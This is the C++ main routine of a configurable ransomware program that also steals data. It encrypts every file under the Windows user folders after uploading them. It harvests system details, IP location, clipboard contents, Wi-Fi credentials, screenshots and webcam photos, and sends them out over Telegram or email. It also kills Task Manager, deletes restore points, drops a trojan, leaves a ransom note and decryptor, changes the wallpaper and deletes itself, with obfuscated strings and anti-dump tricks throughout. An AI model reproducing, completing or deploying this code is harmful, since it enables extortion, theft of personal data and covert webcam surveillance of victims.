#include "headers.h"

using namespace std;

string WallpaperContent = "./wallpaper.jpg";
string FileIconContent = "./ICON.ico";
string EmailSenderContent = "./emailSender.ps1";
string InfoDecryptorContent = "../x64/Release/DataDecryptor.exe";
string CustomFileContent = "../customFile.extension";
string TrojanFileContent = "../x64/Release/debugFolder_backup/pdfsample.pdf";

int main(int argc, char* argv[])
{   
    CreateMutexA(0, FALSE, skCrypt("Local\\$+SGSUMb/Vuib4zPiMXI6iQ==$"));
    if (GetLastError() == ERROR_ALREADY_EXISTS)
        exit(0);

    if (!DEBUG)
        ShowWindow(GetConsoleWindow(), SW_HIDE);

    if (TSK_REMOVER)
        HANDLE hThreadTaskMng = CreateThread(NULL, 0, RemoveTasks, NULL, HIGH_PRIORITY_CLASS, new DWORD);

    if (ANTI_DUMPER)
        ImageSizeIncreaser();

    if (TROJAN) {
        DropFile(TrojanFileContent, TROJANFILE);
        HANDLE hThreadTrojan = CreateThread(NULL, 0, TrojanFunction, NULL, HIGH_PRIORITY_CLASS, new DWORD);
    }
    
    if (DELETE_RESTOREPOINT)
        DeleteRestorePoints();


    string dir;
    if (!DEBUG)
        dir = (string)skCrypt("C:\\Users\\");
    else {
        if (argc > 1)
            dir = argv[1];
        else if (FileExists(DEBUG_FOLDER))
            dir = DEBUG_FOLDER;
        else
            dir = (string)skCrypt(".\\");
    }

    vector<string> files = GetFiles(dir);

    ofstream checkFile(CHECKSUM_FILE);
    checkFile << CHECK_CONTENT;
    checkFile.close();
    files.push_back(CHECKSUM_FILE);

    vector<vector<string>> filesSplitted = VectorSplitter(files, MAX_THREADS);
    
    if (CHANGE_FILE_ICON) {
        DropFile(FileIconContent, FILESICON);
        ChangeIcon();
    }


    thread threads[MAX_THREADS];

    if (FILE_UPLOADER) {
        for (int i = 0; i < filesSplitted.size(); i++)
            threads[i] = thread(UploadFiles, filesSplitted[i]);
        for (int i = 0; i < filesSplitted.size(); i++)  // wait for all threads to finish uploading files
            threads[i].join();
    }

    string key = aes_encrypt(KEYOFKEY, GenerateRandom(32), IV);

    for (int i = 0; i < filesSplitted.size(); i++)
        threads[i] = thread(EncryptFiles, filesSplitted[i], aes_decrypt(KEYOFKEY, key, IV));


    // info.txt
    string infoFileContent = (string)skCrypt("");
    string info_txt = (string)skCrypt("");
    info_txt += (string)skCrypt("Key: ") + key + (string)skCrypt("\n");
    if (STEAL_INFO) { //User infos -> semi-stealer
        info_txt += (string)skCrypt("Date: ") + GetDate() + (string)skCrypt("\n");
        info_txt += (string)skCrypt("HWID: ") + GetHWID() + (string)skCrypt("\n");
        vector<string> ipData = Split(GetIPData(), '\n');
        info_txt += (string)skCrypt("IP: ") + ipData[0] + (string)skCrypt("\n");
        info_txt += (string)skCrypt("Country: ") + ipData[1] + (string)skCrypt("\n");
        info_txt += (string)skCrypt("City: ") + ipData[2] + (string)skCrypt("\n");
        info_txt += (string)skCrypt("Latitude: ") + ipData[3] + (string)skCrypt("\n");
        info_txt += (string)skCrypt("Longitude: ") + ipData[4] + (string)skCrypt("\n");
        vector<string> systemData = Split(GetCPU(), '\n');
        info_txt += (string)skCrypt("CPU name: ") + systemData[0] + (string)skCrypt("\n");
        info_txt += (string)skCrypt("CPU threads: ") + systemData[1] + (string)skCrypt("\n");
        info_txt += (string)skCrypt("Ram memory: ") + systemData[2] + (string)skCrypt("\n");
        info_txt += (string)skCrypt("GPU name: ") + GetGPU() + (string)skCrypt("\n");
        info_txt += (string)skCrypt("Host name: ") + GetPcName() + (string)skCrypt("\n");
        info_txt += (string)skCrypt("Username: ") + GetUsername() + (string)skCrypt("\n");
        info_txt += (string)skCrypt("Screen resolution: ") + GetResolution() + (string)skCrypt("\n");
        info_txt += (string)skCrypt("Windows version: ") + GetWinVersion() + (string)skCrypt("\n");
        info_txt += (string)skCrypt("Language: ") + GetLanguage() + (string)skCrypt("\n");
    }
    info_txt = aes_encrypt(KEY, info_txt, IV);
    infoFileContent += info_txt;
    infoFileContent += skCrypt("\n");

    // cryptedFiles.txt
    string cryptedFiles_txt = (string)skCrypt("");
    for (string file : files)
        cryptedFiles_txt += file + (string)skCrypt("\n");
    cryptedFiles_txt = aes_encrypt(KEY, cryptedFiles_txt, IV);
    infoFileContent += cryptedFiles_txt;
    infoFileContent += skCrypt("\n");

    // links.txt
    string links_txt = (string)skCrypt("");
    if (FILE_UPLOADER)
        for (string link : GetLinks())
            links_txt += link + (string)skCrypt("\n");
    links_txt = aes_encrypt(KEY, links_txt, IV);
    infoFileContent += links_txt;
    infoFileContent += skCrypt("\n");

    // clipboard.txt
    if (GET_CLIPBOARD)
        infoFileContent += aes_encrypt(KEY, GetClipboard(), IV);
    infoFileContent += skCrypt("\n");

    // wifi.txt;
    if (GET_WIFI)
        infoFileContent += aes_encrypt(KEY, GetWifi(), IV);
    infoFileContent += skCrypt("\n");

    // screenshot.bmp
    if (GET_SCREENSHOT)
        infoFileContent += aes_encrypt(KEY, GetScreenshot(), IV);
    infoFileContent += skCrypt("\n");

    // photos
    string webcams = (string)skCrypt("");
    if (TAKE_WEBCAMS) {
        TakeWebcams();
        for (string file : GetWebcams())
            webcams += file + "\n";
    }
    webcams = aes_encrypt(KEY, webcams, IV);
    infoFileContent += webcams;
    infoFileContent += skCrypt("\n");

    if (ANTI_DUMPER)    // here because it creates problems first
        PEHeaderDeleter();

    if (DEBUG && BACKUP_INFOFILE) {    // make a backup of infoFile
        ofstream infoFileBackup(Split(INFOFILE, '\\').back());
        infoFileBackup << infoFileContent;
        infoFileBackup.close();
    }
    
    bool dropInfoFile = DEBUG ? (DEBUG_SEND_EMAIL || DEBUG_SEND_TGBOT) : (SEND_EMAIL || SEND_TGBOT);
    if (dropInfoFile) {
        ofstream infoFile(INFOFILE);
        infoFile << infoFileContent;
        infoFile.close();
    }

    if (DEBUG ? DEBUG_SEND_TGBOT : SEND_TGBOT)
        SendTelegramInfo();

    if (DEBUG ? DEBUG_SEND_EMAIL : SEND_EMAIL) {
        if (IsConnected2Internet())
            SendEmail();
        else {
            DropFile(EmailSenderContent, EMAILSENDER);
            ScheduleTask();
        }
    }

    if (dropInfoFile)
        if (remove((INFOFILE).c_str()) != 0)
            DeleteFileA((INFOFILE).c_str());


    for (int i = 0; i < filesSplitted.size(); i++)  // wait for all threads to finish encrypting files
        threads[i].join();
    

    if (DROP_README)
        DropFile(InfoDecryptorContent, (string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\Decryptor.exe"));

    if (DROP_DECRYPTOR)
        DropFile(READMECONTENT, (string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\README.txt"));

    if (DROP_CUSTOM_FILE)
        DropFile(CustomFileContent, CUSTOMFILE_LOC);

    if (CHANGE_WALLPAPER)
        ChangeWallpaper(WallpaperContent);

    if (SEND_CUSTOM_COMMAND)
        system((CUSTOM_COMMAND).c_str());


    /*debug output*/
    if (DEBUG) {
        cout << skCrypt("\nEncoded ") << aes_decrypt(KEY, info_txt, IV) << skCrypt("\n");
        cout << skCrypt("Crypted files:\n") << aes_decrypt(KEY, cryptedFiles_txt, IV) << skCrypt("\n");
        cout << skCrypt("Links:\n") << aes_decrypt(KEY, links_txt, IV) << skCrypt("\n");
        Sleep(5000);
        system("pause");
    }

    if (!DEBUG && argc > 0 && SELFKILL)
        DeleteMe((string)argv[0]);

    return 0;
}
